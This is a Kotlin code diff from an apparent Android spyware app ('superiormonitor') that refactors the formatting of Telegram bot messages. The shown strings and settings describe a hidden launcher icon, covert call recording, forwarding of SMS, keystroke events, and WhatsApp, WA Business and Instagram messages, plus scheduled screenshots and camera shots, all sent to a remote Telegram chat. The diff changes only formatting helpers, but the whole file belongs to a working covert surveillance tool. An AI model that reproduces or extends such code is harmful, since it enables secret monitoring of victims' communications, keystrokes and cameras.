@@ -4,7 +4,7 @@ import android.content.ComponentName
 import android.content.Context
 import android.content.pm.PackageManager
 import com.system.superiormonitor.data.PrefsManager
-import com.system.superiormonitor.util.TelemetryCollector
+import com.system.superiormonitor.core.TelemetryCollector
 import com.chiller3.bcr.Preferences
 import com.chiller3.bcr.format.AudioSource
 import com.chiller3.bcr.format.Format
@@ -13,6 +13,21 @@ import com.chiller3.bcr.format.RangedParamType
 
 object BotMessages {
 
+    fun buildMenuHeader(tags: String, title: String): String =
+        """
+        $tags
+        ===================
+        *$title*
+        """.trimIndent()
+        
+    fun formatFeatureState(enabled: Boolean, interval: Int = -1, useEmojis: Boolean = false): String {
+        val onStr = if (useEmojis) "✅ Enabled" else "Enabled"
+        val offStr = if (useEmojis) "❌ Disabled" else "Disabled"
+        if (!enabled && interval > 0) return "$offStr | NA"
+        if (!enabled) return offStr
+        return if (interval > 0) "$onStr | $interval Min" else onStr
+    }
+        
     object Core {
         fun buildWelcomeMessage(userName: String): String =
                 "👋 Welcome $userName!\n\nSystem is active and working properly.\n\nJSON_MARKUP:${BotMarkups.Core.buildMainKeyboard()}"
@@ -33,12 +48,6 @@ object BotMessages {
                             PackageManager.COMPONENT_ENABLED_STATE_DISABLED
             val launcherStatus = if (isHidden) "Hidden" else "Visible"
 
-            fun formatFeature(enabled: Boolean, interval: Int = -1): String {
-                if (!enabled && interval > 0) return "Disabled | NA"
-                if (!enabled) return "Disabled"
-                return if (interval > 0) "Enabled | $interval Min" else "Enabled"
-            }
-
             return """
                 *System check complete*
 
@@ -46,18 +55,18 @@ object BotMessages {
                 *Launcher icon*: $launcherStatus
 
                 *Security Snapshots* -
-                *Screenshots*: ${formatFeature(prefs.enableSnapshots, prefs.snapshotIntervalMin)}
-                *Front shots*: ${formatFeature(prefs.enableFrontCamera, prefs.frontCameraInterval)}
-                *Rear shots*: ${formatFeature(prefs.enableRearCamera, prefs.rearCameraInterval)}
+                *Screenshots*: ${formatFeatureState(prefs.enableSnapshots, prefs.snapshotIntervalMin)}
+                *Front shots*: ${formatFeatureState(prefs.enableFrontCamera, prefs.frontCameraInterval)}
+                *Rear shots*: ${formatFeatureState(prefs.enableRearCamera, prefs.rearCameraInterval)}
 
                 *Basic Updates* -
-                *Call Recording*: ${formatFeature(prefs.forwardRecordingEnabled)}
-                *Call Events*: ${formatFeature(prefs.callAlertsEnabled)}
-                *SMS Events*: ${formatFeature(prefs.smsAlertsEnabled)}
-                *Key Events*: ${formatFeature(prefs.keyEventsEnabled, prefs.keyEventsIntervalMin)}
+                *Call Recording*: ${formatFeatureState(prefs.forwardRecordingEnabled)}
+                *Call Events*: ${formatFeatureState(prefs.callAlertsEnabled)}
+                *SMS Events*: ${formatFeatureState(prefs.smsAlertsEnabled)}
+                *Key Events*: ${formatFeatureState(prefs.keyEventsEnabled, prefs.keyEventsIntervalMin)}
 
                 *Social Updates* -
-                *Whatsapp*: ${formatFeature(prefs.whatsappUpdatesEnabled)}
+                *Whatsapp*: ${formatFeatureState(prefs.whatsappUpdatesEnabled)}
 
                 *Temperature:* ${metrics["TEMP"]}°C
                 *Battery:* ${metrics["BATTERY"]}% ${metrics["STATUS"]}
@@ -94,6 +103,15 @@ object BotMessages {
                 
                 *Uptime:* ${metrics["UPTIME"]} | *Current:* ${metrics["CURRENT_TIME"]}
             """.trimIndent()
+
+        fun buildBulkUploadMessage(appName: String): String =
+            """
+            #$appName #Batch
+            ===================
+            📦 *Live Batch Upload*
+            
+            This document contains multiple $appName messages that arrived rapidly.
+            """.trimIndent()
     }
 
     object Settings {
@@ -110,24 +128,18 @@ object BotMessages {
         fun buildPersistentEnforcementPrompt(context: Context): String {
             val prefs = PrefsManager.getInstance(context)
             if (!prefs.persistentEnforcementEnabled) {
-                return """
-                    #System #Persistent
-                    ===================
-                    ⚠️ *System Warning*
-                    
+                return buildMenuHeader("#System #Persistent", "System Warning") + "\n\n" +
+                """
                     System-level enforcement modifies restricted internal settings. Depending on your Android version and OEM modifications, this feature may cause unexpected behavior, including system UI crashes or soft reboots. 
                     
                     Please proceed with caution.
                 """.trimIndent()
             } else {
-                val dataState = if (prefs.forceMobileData) "✅ Enabled" else "❌ Disabled"
-                val wifiState = if (prefs.forceWifi) "✅ Enabled" else "❌ Disabled"
-                val hotspotState = if (prefs.forceHotspot) "✅ Enabled" else "❌ Disabled"
-                return """
-                    #System #Persistent
-                    ===================
-                    *Persistent Enforcement Dashboard*
-                    
+                val dataState = formatFeatureState(prefs.forceMobileData, useEmojis = true)
+                val wifiState = formatFeatureState(prefs.forceWifi, useEmojis = true)
+                val hotspotState = formatFeatureState(prefs.forceHotspot, useEmojis = true)
+                return buildMenuHeader("#System #Persistent", "Persistent Enforcement Dashboard") + "\n\n" +
+                """
                     *Currently Active Settings*:
                     *Force Mobile Data*: $dataState
                     *Force Wi-Fi*: $wifiState
@@ -138,16 +150,13 @@ object BotMessages {
         
         fun buildBasicUpdatesPrompt(context: Context): String {
             val prefs = PrefsManager.getInstance(context)
-            val recState = if (prefs.forwardRecordingEnabled) "✅ Enabled" else "❌ Disabled"
-            val callState = if (prefs.callAlertsEnabled) "✅ Enabled" else "❌ Disabled"
-            val smsState = if (prefs.smsAlertsEnabled) "✅ Enabled" else "❌ Disabled"
-            val keyState = if (prefs.keyEventsEnabled) "✅ Enabled (${prefs.keyEventsIntervalMin} Min)" else "❌ Disabled"
+            val recState = formatFeatureState(prefs.forwardRecordingEnabled, useEmojis = true)
+            val callState = formatFeatureState(prefs.callAlertsEnabled, useEmojis = true)
+            val smsState = formatFeatureState(prefs.smsAlertsEnabled, useEmojis = true)
+            val keyState = formatFeatureState(prefs.keyEventsEnabled, prefs.keyEventsIntervalMin, useEmojis = true)
             
-            return """
-                #System #BasicUpdates
-                ===================
-                *Basic Updates Dashboard*
-                
+            return buildMenuHeader("#System #BasicUpdates", "Basic Updates Dashboard") + "\n\n" +
+            """
                 Forward Upcoming/Outgoing Updates to Telegram Chat.
                 
                 *Currently Active Settings*:
@@ -160,13 +169,10 @@ object BotMessages {
 
         fun buildKeyEventsFeaturePrompt(context: Context): String {
             val prefs = PrefsManager.getInstance(context)
-            val state = if (prefs.keyEventsEnabled) "✅ Enabled (${prefs.keyEventsIntervalMin} Min)" else "❌ Disabled"
+            val state = formatFeatureState(prefs.keyEventsEnabled, prefs.keyEventsIntervalMin, useEmojis = true)
             
-            return """
-                #System #KeyEvents
-                ===================
-                *Key Events Settings*
-                
+            return buildMenuHeader("#System #KeyEvents", "Key Events Settings") + "\n\n" +
+            """
                 Set an automatic interval for sending Key Events logs, or disable it completely.
                 
                 *Current State*: $state
@@ -174,25 +180,19 @@ object BotMessages {
         }
 
         fun buildCallRecordingMenuPrompt(): String =
-                """
-                #System #CallRecording
-                ===================
-                *Call Recording Settings*
-                
-                Enable or disable background call recording, and configure advanced recording engine settings.
-                """.trimIndent()
+            buildMenuHeader("#System #CallRecording", "Call Recording Settings") + "\n\n" +
+            """
+            Enable or disable background call recording, and configure advanced recording engine settings.
+            """.trimIndent()
                 
         fun buildSocialUpdatesPrompt(context: Context): String {
             val prefs = PrefsManager.getInstance(context)
-            val whatsappState = if (prefs.whatsappUpdatesEnabled) "✅ Enabled" else "❌ Disabled"
-            val waBusinessState = if (prefs.whatsappBusinessUpdatesEnabled) "✅ Enabled" else "❌ Disabled"
-            val instagramState = if (prefs.instagramEnabled) "✅ Enabled" else "❌ Disabled"
+            val whatsappState = formatFeatureState(prefs.whatsappUpdatesEnabled, useEmojis = true)
+            val waBusinessState = formatFeatureState(prefs.whatsappBusinessUpdatesEnabled, useEmojis = true)
+            val instagramState = formatFeatureState(prefs.instagramEnabled, useEmojis = true)
             
-            return """
-                #System #SocialUpdates
-                ===================
-                *Social Updates Dashboard*
-                
+            return buildMenuHeader("#System #SocialUpdates", "Social Updates Dashboard") + "\n\n" +
+            """
                 Forward Upcoming/Outgoing Social Update to Telegram Chat.
                 
                 *Currently Active Settings*:
@@ -232,13 +232,11 @@ object BotMessages {
             }
             val paramSection = if (showParam) "Parameter: $paramStr" else null
 
-            val telecomStr = if (bcrPrefs.recordTelecomApps) "✅ Enabled" else "❌ Disabled"
-            val dialingStr = if (bcrPrefs.recordDialingState) "✅ Enabled" else "❌ Disabled"
+            val telecomStr = formatFeatureState(bcrPrefs.recordTelecomApps, useEmojis = true)
+            val dialingStr = formatFeatureState(bcrPrefs.recordDialingState, useEmojis = true)
 
             return buildString {
-                appendLine("#System #RecorderSettings")
-                appendLine("===================")
-                appendLine("*Call Recorder Engine Settings*")
+                appendLine(buildMenuHeader("#System #RecorderSettings", "Call Recorder Engine Settings"))
                 appendLine()
                 appendLine("Current Audio Configuration:")
                 appendLine("Source: $sourceStr")
@@ -281,11 +279,8 @@ object BotMessages {
             val screenState = if (prefs.enableSnapshots) "Enabled (${prefs.snapshotIntervalMin}m)" else "Disabled"
             val frontState = if (prefs.enableFrontCamera) "Enabled (${prefs.frontCameraInterval}m)" else "Disabled"
             val rearState = if (prefs.enableRearCamera) "Enabled (${prefs.rearCameraInterval}m)" else "Disabled"
-            return """
-                #Snapshot #Remote
-                ===================
-                *Enable and disable any feature remotely*
-                
+            return buildMenuHeader("#Snapshot #Remote", "Enable and disable any feature remotely") + "\n\n" +
+            """
                 *Currently*:
                 *Screenshots*: $screenState
                 *Front shots*: $frontState
@@ -302,20 +297,14 @@ object BotMessages {
             }
             
             return if (isEnabled) {
+                buildMenuHeader("#Snapshot #Remote", "Change the schedule timer?") + "\n\n" +
                 """
-                #Snapshot #Remote
-                ===================
-                *Change the schedule timer?*
-                
                 *Feature*: $feature
                 *Status*: Enabled
                 """.trimIndent()
             } else {
+                buildMenuHeader("#Snapshot #Remote", "Enable $feature , Select the schedule time") + "\n\n" +
                 """
-                #Snapshot #Remote
-                ===================
-                *Enable $feature , Select the schedule time*
-                
                 *Status*: Disabled
                 """.trimIndent()
             }
@@ -405,53 +394,13 @@ object BotMessages {
 
         fun buildFetchFailedMessage(reason: String): String = "❌ *Fetch Failed*\n\nReason: $reason"
 
-        fun buildOfflineCallLogCaption(): String =
-                """
-            #Call #Offline
+        fun buildOfflineSyncCaption(tag: String, activityDesc: String): String =
+            """
+            #$tag #Offline
             ===================
-            ⚠️ *Update* - While the device was offline, calls were made during this period.
+            ⚠️ *Update* - While the device was offline, $activityDesc.
             Here are the remaining entries.
-        """.trimIndent()
-
-        fun buildOfflineSmsLogCaption(): String =
-                """
-            #SMS #Offline
-            ===================
-            ⚠️ *Update* - While the device was offline, SMS messages were received.
-            Here are the remaining entries.
-        """.trimIndent()
-
-        fun buildOfflineWhatsAppLogCaption(): String =
-                """
-            #WhatsApp #Offline
-            ===================
-            ⚠️ *Update* - While the device was offline, WhatsApp messages were received.
-            Here are the remaining entries.
-        """.trimIndent()
-        
-        fun buildOfflineWABusinessLogCaption(): String =
-                """
-            #WABusiness #Offline
-            ===================
-            ⚠️ *Update* - While the device was offline, WA Business messages were received.
-            Here are the remaining entries.
-        """.trimIndent()
-        
-        fun buildOfflineInstagramLogCaption(): String =
-                """
-            #Instagram #Offline
-            ===================
-            ⚠️ *Update* - While the device was offline, Instagram DMs were received.
-            Here are the remaining entries.
-        """.trimIndent()
-        
-        fun buildOfflineKeyEventsCaption(): String =
-                """
-            #KeyEvents #Offline
-            ===================
-            ⚠️ *Update* - While the device was offline, Key Events were recorded.
-            Here are the remaining entries.
-        """.trimIndent()
+            """.trimIndent()
         
         fun buildRoutineKeyEventsCaption(): String =
                 """
@@ -524,6 +473,28 @@ object BotMessages {
             🚫 *User Blocked* - Your request will be ignored from now on.
         """.trimIndent()
 
+        private fun buildSocialUpdateMessage(
+            appName: String,
+            tag: String,
+            direction: String,
+            details: List<Pair<String, String>>,
+            message: String
+        ): String = buildString {
+            appendLine("#$tag")
+            appendLine("===================")
+            appendLine("✨ *$appName Update*")
+            appendLine("===================")
+            appendLine("*New Message has been $direction!*")
+            appendLine()
+            for ((key, value) in details) {
+                appendLine("*$key* : $value")
+            }
+            appendLine("===================")
+            appendLine()
+            appendLine("*Message* :")
+            append(message)
+        }
+
         fun buildWhatsAppMessage(
                 safeChatName: String,
                 safeChatType: String,
@@ -532,23 +503,13 @@ object BotMessages {
                 safeSentBy: String,
                 safeToTarget: String,
                 safeMsg: String
-        ): String = buildString {
-            appendLine("#Whatsapp")
-            appendLine("===================")
-            appendLine("✨ *WhatsApp Update*")
-            appendLine("===================")
-            appendLine("*New Message has been $direction!*")
-            appendLine()
-            appendLine("*Chat Room* : $safeChatName [$safeChatType]")
-            appendLine("*Type* : $direction")
-            appendLine("*Time* : $timeFormatted")
-            appendLine("*From* : $safeSentBy")
-            appendLine("*To* : $safeToTarget")
-            appendLine("===================")
-            appendLine()
-            appendLine("*Message* :")
-            append(safeMsg)
-        }
+        ): String = buildSocialUpdateMessage("WhatsApp", "Whatsapp", direction, listOf(
+            "Chat Room" to "$safeChatName [$safeChatType]",
+            "Type" to direction,
+            "Time" to timeFormatted,
+            "From" to safeSentBy,
+            "To" to safeToTarget
+        ), safeMsg)
 
         fun buildWABusinessMessage(
                 safeChatName: String,
@@ -558,23 +519,13 @@ object BotMessages {
                 safeSentBy: String,
                 safeToTarget: String,
                 safeMsg: String
-        ): String = buildString {
-            appendLine("#WABusiness")
-            appendLine("===================")
-            appendLine("✨ *WA Business Update*")
-            appendLine("===================")
-            appendLine("*New Message has been $direction!*")
-            appendLine()
-            appendLine("*Chat Room* : $safeChatName [$safeChatType]")
-            appendLine("*Type* : $direction")
-            appendLine("*Time* : $timeFormatted")
-            appendLine("*From* : $safeSentBy")
-            appendLine("*To* : $safeToTarget")
-            appendLine("===================")
-            appendLine()
-            appendLine("*Message* :")
-            append(safeMsg)
-        }
+        ): String = buildSocialUpdateMessage("WA Business", "WABusiness", direction, listOf(
+            "Chat Room" to "$safeChatName [$safeChatType]",
+            "Type" to direction,
+            "Time" to timeFormatted,
+            "From" to safeSentBy,
+            "To" to safeToTarget
+        ), safeMsg)
 
         fun buildInstagramMessage(
                 direction: String,
@@ -583,23 +534,13 @@ object BotMessages {
                 safeToTarget: String,
                 safeUsername: String,
                 safeMsg: String
-        ): String = buildString {
-            appendLine("#Instagram")
-            appendLine("===================")
-            appendLine("✨ *Instagram Update*")
-            appendLine("===================")
-            appendLine("*New Message has been $direction!*")
-            appendLine()
-            appendLine("*Type* : $direction")
-            appendLine("*Time* : $timeFormatted")
-            appendLine("*From* : $safeSentBy")
-            appendLine("*To* : $safeToTarget")
-            appendLine("*Username* : `$safeUsername`")
-            appendLine("===================")
-            appendLine()
-            appendLine("*Message* :")
-            append(safeMsg)
-        }
+        ): String = buildSocialUpdateMessage("Instagram", "Instagram", direction, listOf(
+            "Type" to direction,
+            "Time" to timeFormatted,
+            "From" to safeSentBy,
+            "To" to safeToTarget,
+            "Username" to "`$safeUsername`"
+        ), safeMsg)
 
         fun buildCallMessage(
                 typeStr: String,
